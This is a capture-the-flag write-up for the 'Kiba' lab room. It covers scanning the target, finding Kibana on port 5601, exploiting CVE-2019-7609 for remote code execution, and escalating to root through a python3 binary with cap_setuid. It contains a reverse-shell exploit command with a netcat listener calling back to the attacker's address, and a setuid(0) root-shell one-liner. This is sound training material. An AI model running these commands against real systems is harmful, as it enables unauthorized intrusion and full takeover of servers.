# 🔒 Kiba Room Writeup — Kibana RCE & Privilege Escalation

## 📋 Room Overview

**Kiba** is an engaging CTF challenge that focuses on identifying and exploiting a critical vulnerability in Kibana (a data visualization dashboard). The room requires participants to:
- Identify prototype-based inheritance vulnerabilities
- Discover hidden services and ports
- Exploit a known CVE to achieve Remote Code Execution (RCE)
- Escalate privileges using Linux capabilities

---

## ❓ Question 1️⃣ — Prototype-Based Inheritance Vulnerability

**Question:** *What is the vulnerability that is specific to programming languages with prototype-based inheritance?*

### 🎯 Approach & Solution

Upon accessing the web application, I encountered a classic cryptographic puzzle featuring a butterfly image — a well-known unsolved puzzle in cryptography. However, the real challenge lay deeper.

Using reconnaissance techniques, I performed directory enumeration on the target system:

![Initial Target View](https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png)

The directory enumeration revealed no endpoints except `/index.html`, which suggested the real attack surface was elsewhere. Through a simple Google search combined with the context of "prototype-based inheritance," I quickly identified the vulnerability type.

**Answer:** **Prototype Pollution** — A vulnerability specific to languages with prototype-based inheritance (JavaScript, Node.js, etc.) that allows attackers to manipulate object prototypes and inject malicious properties.

---

## ❓ Question 2️⃣ — Visualization Dashboard Version

**Question:** *What is the version of visualization dashboard installed in the server?*

### 🔍 Discovery & Analysis

**Initial Network Reconnaissance:**

First, I conducted a comprehensive Nmap scan on the target to map out available services:

```bash
nmap -sV -A -O -Pn 10.48.140.152
```

**Nmap Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

**Additional Testing:**

- **Cookie Analysis:** No session cookies were created by the application, suggesting a stateless design
- **Response Headers:** All response headers appeared normal (Apache server, standard HTTP/1.1 200 OK)
- **HTTP Methods:**
  ```
  Allow: GET, HEAD, POST, OPTIONS
  ```
- **Timing Anomaly:** When sending a HEAD request, the response took approximately **5 seconds** to return — a significant deviation that suggested background processing

**Port Discovery:**

A full port scan revealed an additional service running on a non-standard port:

```bash
nmap -p- <TARGET>
```

**Result:**
```
5601/tcp open esmagent
```

This port `5601` is the default port for **Kibana**, the Elasticsearch visualization dashboard!

**Version Identification:**

Navigating to the Kibana management endpoint:
```
http://10.48.140.152:5601/app/kibana#/management?_g=()
```

The version information is clearly displayed on this page, revealing the dashboard version.

**Answer:** *(The specific version is displayed on the management page)*

---

## ❓ Question 3️⃣ — CVE Number

**Question:** *What is the CVE number for this vulnerability? (Format: CVE-0000-0000)*

### 🔍 CVE Research & Exploitation

With the Kibana version identified, I searched for known vulnerabilities (CVEs) affecting that specific version. The search revealed:

**Answer:** **CVE-2019-7609** — A critical Remote Code Execution vulnerability in Kibana that affects multiple versions

### 📚 Exploit Reference

A public exploit for this CVE is available at:
```
https://github.com/LandGrey/CVE-2019-7609
```

**Exploit Usage:**

```python
python2 CVE-2019-7609-kibana-rce.py -h

usage: CVE-2019-7609-kibana-rce.py [-h] [-u URL] [-host REMOTE_HOST]
                                   [-port REMOTE_PORT] [--shell]

optional arguments:
  -h, --help         show this help message and exit
  -u URL             such as: http://127.0.0.1:5601
  -host REMOTE_HOST  reverse shell remote host: such as: 1.1.1.1
  -port REMOTE_PORT  reverse shell remote port: such as: 8888
  --shell            reverse shell after verify
```

---

## ❓ Question 4️⃣ — User Flag

**Question:** *Compromise the machine and locate user.txt*

### 💻 Exploitation & Shell Access

Using the CVE-2019-7609 exploit, I set up a listener on my attacking machine and executed the exploit with the correct syntax:

```bash
# On attacker machine (listener)
nc -lvnp 8888

# Execute exploit
python2 CVE-2019-7609-kibana-rce.py -u http://10.48.140.152:5601 \
  -host <YOUR_IP> -port 8888 --shell
```

This successfully provided a reverse shell connection to the target system.

**Flag Location:** The user flag was located at the standard path:
```
/home/kiba/user.txt
```

**Answer:** *(The user flag content)*

---

## ❓ Question 5️⃣ — Linux Capabilities

**Question:** *Capabilities is a concept that provides a security system that allows "divide" root privileges into different values*

### 🔐 Understanding Linux Capabilities

Linux capabilities are a powerful security mechanism that break down traditional root privileges into granular, independently assignable capabilities. Rather than an all-or-nothing root access model, capabilities allow specific privileges to be assigned to executable files and processes.

**Key Points:**
- Each capability provides a specific privilege (e.g., `cap_setuid`, `cap_net_raw`, `cap_dac_override`)
- Capabilities can be assigned with `+ep` flags (Effective and Permitted)
- This fine-grained approach follows the principle of least privilege
- Applications only get the specific capabilities they need

---

## ❓ Question 6️⃣ — Listing Capabilities

**Question:** *How would you recursively list all of these capabilities?*

### 🔍 Capability Enumeration

To discover all files with assigned capabilities on the system, I used the `getcap` command with recursive enumeration:

```bash
getcap -r / 2>/dev/null
```

**Output:**
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

**Analysis:**

The most interesting capability for privilege escalation was:
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

This binary had the `cap_setuid` capability, which allows changing the UID (User ID) — the foundation for privilege escalation.

**Answer:** `getcap -r /`

---

## ❓ Question 7️⃣ — Privilege Escalation to Root

**Question:** *Escalate privileges and obtain root.txt*

### 🚀 Privilege Escalation Technique

With the discovery of the `python3` binary having `cap_setuid` capabilities, I could exploit this to escalate to root privileges.

**Step 1:** Verify the capability can execute Python
```bash
python3 -c 'import os; os.system("/bin/sh")'
```

**Step 2:** Exploit the capability to set UID to 0 (root)
```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

This command:
1. Uses the `python3` binary with `cap_setuid` capability
2. Imports the `os` module (system operations)
3. Calls `os.setuid(0)` to change the effective UID to 0 (root)
4. Spawns a shell with root privileges

**Root Access Confirmed:**

After execution, I successfully obtained root shell access and was able to read the root flag:

```bash
cat /root/root.txt
```

**Answer:** *(The root flag content)*

---

## 📊 Summary & Key Learnings

| 🎯 Step | 📌 Technique | 🔑 Tool |
|:---:|:---|:---|
| 1 | Information Gathering | Nmap, Port Scanning |
| 2 | Service Identification | Banner Grabbing |
| 3 | CVE Research | Google, GitHub |
| 4 | RCE Exploitation | CVE-2019-7609 Exploit |
| 5 | Privilege Enumeration | `getcap -r /` |
| 6 | Privilege Escalation | Linux Capabilities Abuse |

### 🎓 Key Concepts Mastered

✅ **Prototype Pollution** — Understanding prototype-based language vulnerabilities  
✅ **Port Discovery** — Finding hidden services through comprehensive port scanning  
✅ **CVE Exploitation** — Researching and executing known vulnerabilities  
✅ **Linux Capabilities** — Exploiting granular privilege mechanisms  
✅ **Reverse Shell** — Establishing remote command execution  

---

## 🔗 References & Resources

- **CVE-2019-7609:** https://github.com/LandGrey/CVE-2019-7609
- **Linux Capabilities:** `man getcap`
- **Kibana Documentation:** https://www.elastic.co/kibana

